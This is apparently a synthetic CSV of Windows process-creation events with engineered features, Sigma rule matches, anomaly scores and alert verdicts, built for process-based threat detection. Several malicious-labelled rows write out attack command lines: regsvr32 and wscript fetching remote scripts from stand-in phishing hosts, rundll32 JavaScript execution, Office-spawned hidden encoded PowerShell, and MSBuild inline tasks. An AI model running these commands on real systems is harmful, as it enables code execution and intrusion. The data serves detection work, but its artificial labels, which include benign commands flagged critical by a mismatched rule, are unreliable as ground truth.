UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-05T14:50:14.141Z,{3D1AF6E8-CC06-45DE-8506-C1471DF3FE69},53544,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,29103,CORP\admin,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,14,0,0,50,3.9031,1.575697663509122,1.3977339161267168,0,3,2,False,None,none,,72.51058698492865,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.7,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-02T16:38:42.106Z,{9D6484A7-0424-499A-9EAF-7A97AB5A948A},47294,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4304,CORP\pchen,Medium,0,,,gray_area,0,1,1,0,57,4.4964,0,0,0,0,3,0.0,0,0,1,0,0,0,788896773,16,0,0,38,3.9031,0.813909989039063,0.9935947159962341,0,1,1,False,None,none,,71.19113089666185,25,explorer.exe → rundll32.exe: Explorer launching rundll32,True,ALERT,MEDIUM,50.8,"ANOMALY SCORE: 71/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4)"
2024-07-04T17:27:24.004Z,{C39DA5DF-033F-4321-9B03-6690F67D2742},47185,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,15076,CORP\agarwal,Medium,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,27,1.231,2.5780498667591996,1.4642169857295075,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,43.73438326394255,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.4,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 44 | Chain Risk: 5
2024-07-03T12:21:29.803Z,{4F86EDD8-EC68-4F30-AB80-A8B0B08F0A17},14557,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,35151,CORP\admin,High,0,,,benign,0,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,12,0,0,21,1.231,2.0969208091991622,1.599578911227083,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,42.31850395421108,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-03T09:15:35.615Z,{AF3F344F-4656-410C-A178-DAFBA688B332},40322,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,48263,CORP\sysadmin,High,0,,,benign,0,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,1,0,0,0,945137867,9,0,0,15,1.231,3.0190848361892337,1.084185385162199,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,57.41693569451816,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 57 | Chain Risk: 5
2024-07-02T04:47:10.966Z,{43C3B5ED-8DAB-47C9-AF39-C0809F29B52F},37636,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,25204,CORP\admin,High,0,,,gray_area,1,3,1,1,131,4.9907,0,0,0,0,10,0.0,0,0,2,0,0,1,4082297620,4,1,0,47,1.3846,3.780872510659293,1.7337429435786635,0,3,2,False,None,none,,85.19464710049434,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,60.1,"ANOMALY SCORE: 85/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); command length significantly above baseline: 3.78 (baseline: -0.00±1.00, z=3.8); unusually long command line: 131.00 (baseline: 36.70±24.93, z=3.8); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0)"
2024-07-05T02:57:00.427Z,{2794CA43-F573-4776-9FF0-D4B64123A90D},65237,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host7024.xyz/payloads/file254.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3898,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,78,4.724,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,2,1,0,57,3.9031,1.6558858397691283,1.3343953160321653,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,90.11503202875937,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-06T04:23:22.463Z,{E816868D-91EB-4E09-862F-197EB76F6FAD},32865,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc665.exe"")",C:\Windows\explorer.exe,cmd.exe,33863,CORP\agarwal,Medium,1,T1218.011,Rundll32 JavaScript,malicious,0,1,1,0,135,5.1511,1,0,0,0,5,0.2,0,0,1,0,0,0,788896773,4,1,1,23,3.9031,3.9412488631793052,1.9739205193509095,0,12,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,96.8704261962982,40,"explorer.exe → rundll32.exe: Explorer launching rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.7,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 97 | Chain Risk: 40
2024-07-03T04:58:58.166Z,{2505ADC0-58C6-4BE9-8F9E-9C99A9C175FF},7712,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document2.docm",15278,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,222,4.6536,1,0,0,1,8,0.375,1,0,2,1,0,0,1267013000,4,1,0,58,3.9031,7.429434530489576,1.2289807191844955,0,12,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-05T16:45:35.719Z,{2B7A54C5-4ED5-4827-BE83-EDE646BF18BB},50565,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document72.docm",53597,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,222,4.6536,1,0,0,1,8,0.375,1,0,2,1,0,0,1182374401,16,0,0,45,3.9031,7.429434530489576,1.2289807191844955,0,1,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,99.63866994300045,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-03T11:33:38.521Z,{8AC53512-C43D-4591-A291-385848432B81},13363,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,50010,CORP\itops,High,0,,,benign,0,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,11,0,0,33,1.231,2.0568267210691595,1.0489972739985602,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,42.079351479603176,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-01T11:42:42.363Z,{AEBFC63E-26C4-4685-AEB9-65A5D8D87F9E},11901,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,43401,CORP\agarwal,Medium,0,,,benign,0,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,11,0,0,42,1.231,2.7785203074092153,1.294116158998041,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.35945247598917,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-04T04:31:46.996Z,{F87BB6F6-C3A7-4BE1-8127-9D1C14A2EE70},28323,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,54989,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,131,4.9907,0,0,0,0,10,0.0,0,0,2,0,0,1,4082297620,4,1,0,31,1.3846,3.780872510659293,1.7337429435786635,0,10,2,False,None,none,,85.19464710049434,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,60.1,"ANOMALY SCORE: 85/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); command length significantly above baseline: 3.78 (baseline: -0.00±1.00, z=3.8); unusually long command line: 131.00 (baseline: 36.70±24.93, z=3.8); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0)"
2024-07-01T04:05:35.771Z,{C58C3792-EFD4-4B6B-82E9-08F9CC798B7B},1814,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil-payload7721.com/drop/file436.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46426,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious,1,19,1,0,80,4.7394,1,1,0,0,6,0.1667,0,0,2,0,0,1,2398546659,4,1,0,5,3.9031,1.7360740160291346,1.3574547590925925,0,6,1,True,Regsvr32 Squiblydoo Remote SCT Execution,critical,attack.t1218.010,89.96334658451012,85,"cmd.exe → regsvr32.exe: Command shell invoking regsvr32 [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Regsvr32 Squiblydoo Remote SCT Execution | ML Score: 90 | Chain Risk: 85
2024-07-02T04:42:28.152Z,{F2E64B78-906D-49D9-82D4-7E4B371D17CB},57776,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,48701,CORP\admin,High,0,,,gray_area,1,3,1,1,131,4.9907,0,0,0,0,10,0.0,0,0,2,0,0,1,4082297620,4,1,0,42,1.3846,3.780872510659293,1.7337429435786635,0,3,2,False,None,none,,85.19464710049434,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,60.1,"ANOMALY SCORE: 85/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); command length significantly above baseline: 3.78 (baseline: -0.00±1.00, z=3.8); unusually long command line: 131.00 (baseline: 36.70±24.93, z=3.8); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0)"
2024-07-04T15:07:31.637Z,{B32E3B1E-9BA5-4FFB-8F7E-26CEBC33FCD0},62535,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://internal-wsus.corp.local/package18.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,43348,CORP\itops,High,0,,,gray_area,1,12,0,0,78,4.4025,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,15,0,0,7,3.9031,1.6558858397691283,0.852992007984924,0,5,2,False,None,none,,70.45392043644931,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.3,"ANOMALY SCORE: 70/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-06T04:01:07.783Z,{6FB721FD-30F0-4DD3-9CBC-E2BE9F3C336B},19167,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,33312,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,234,4.7724,1,0,0,1,8,0.375,1,0,2,1,0,0,3072976960,4,1,1,1,3.9031,7.910563588049614,1.406867851364938,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-04T10:56:18.740Z,{D6F2D15C-2549-4957-8469-28EBA7BEB6D0},47621,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://repo.corp.local/package46.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,26583,CORP\itops,High,0,,,gray_area,1,12,0,0,69,4.2843,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,10,0,0,56,3.9031,1.2950390465991002,0.6760032956639791,0,5,2,False,None,none,,70.67343782049453,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.4,"ANOMALY SCORE: 71/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T14:06:00.100Z,{F3A8EF8A-DBC7-49F8-9EF9-8E1F28F6FDDE},17956,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15549,CORP\admin,High,0,,,benign,1,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,14,0,0,6,1.3846,2.0568267210691595,1.0489972739985602,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.48537270448572,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-01T09:10:57.156Z,{F4EF5E3C-54DB-4550-862D-35C01ABDEE7B},49416,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47045,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,9,0,0,10,1.3846,8.11103402869963,1.525908482748314,0,10,2,False,None,none,,94.5437828199243,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.4,"ANOMALY SCORE: 95/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T09:40:54.730Z,{68FF4EB2-3428-4425-BC52-E9000DB05ECE},29297,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package4.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,65191,CORP\sysadmin,High,0,,,gray_area,1,12,0,0,70,4.3381,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,9,0,0,40,3.9031,1.3351331347291033,0.7565616097322263,0,10,2,False,None,none,,70.83782148503911,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.6,"ANOMALY SCORE: 71/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T14:34:01.005Z,{72F8F61F-D30E-437C-8FFE-D7E87BEBF67D},26882,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\Backups,C:\Windows\System32\cmd.exe,cmd.exe,8646,CORP\itops,High,0,,,gray_area,1,3,1,1,153,4.7508,1,1,0,0,10,0.1,0,0,2,0,0,1,4082297620,14,0,0,34,1.3846,4.662942449519361,1.374524736423039,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,97.77085010895149,20,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +15 URL in command, +5 suspicious flags]",False,ALERT,CRITICAL,99.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 98 | Chain Risk: 20
2024-07-02T12:49:06.915Z,{15256D95-2079-44EC-9AD9-0D9790C6129E},38611,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45179,CORP\sysadmin,High,0,,,benign,1,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,12,0,0,49,1.3846,2.0568267210691595,1.0489972739985602,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.4310702027376,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 49 | Chain Risk: 5
2024-07-03T22:04:22.430Z,{88C0E78F-7C79-46E7-9A65-3E30AF8DBA60},40460,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host6775.cc/script898.js,C:\Windows\System32\cmd.exe,cmd.exe /c,48790,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,61,4.1912,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,22,0,0,4,3.9031,0.9742863415590755,0.5365984807986665,0,9,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.53760449890844,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 75
2024-07-05T14:37:07.356Z,{4F20D979-B2DC-4B33-B959-8CD67DD30339},24067,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,56411,CORP\itops,High,0,,,benign,1,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,14,0,0,37,1.3846,1.7761681041591375,0.9489731963078728,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.06341681071394,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-01T16:12:49.643Z,{C751BBD5-F0ED-4584-947A-D9EB64C46C3E},13009,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document38.docm",51114,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,202,4.5512,1,0,0,1,7,0.1429,1,0,2,1,0,0,1182374401,16,0,0,12,3.9031,6.627552767889514,1.0756503964969757,0,1,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,97.51834794642623,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command]",True,ALERT,CRITICAL,99.8,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 98 | Chain Risk: 100
2024-07-01T09:40:50.856Z,{67D2F496-FF9B-48BD-88B8-FDCC41DE5331},31119,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,2067,CORP\mjones,Medium,0,,,benign,0,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,1,0,0,0,945137867,9,0,0,40,1.231,3.0190848361892337,1.084185385162199,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,55.86339137640002,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 56 | Chain Risk: 5
2024-07-05T04:22:50.078Z,{0248A4B5-72F3-47CA-8838-10CE97503B04},43699,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\sys865.csproj,C:\Windows\System32\cmd.exe,cmd.exe,54984,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,87,5.0954,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,4,1,0,22,3.9031,2.0167326329391564,1.890517209060921,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.98802370663076,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.2,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 82 | Chain Risk: 75
2024-07-03T12:08:24.792Z,{806C2730-9D55-4E22-9F69-34A4F8D8DAA5},54304,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,50358,CORP\admin,High,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,12,0,0,8,1.3846,2.0969208091991622,1.599578911227083,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.21740037800775,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 48 | Chain Risk: 5
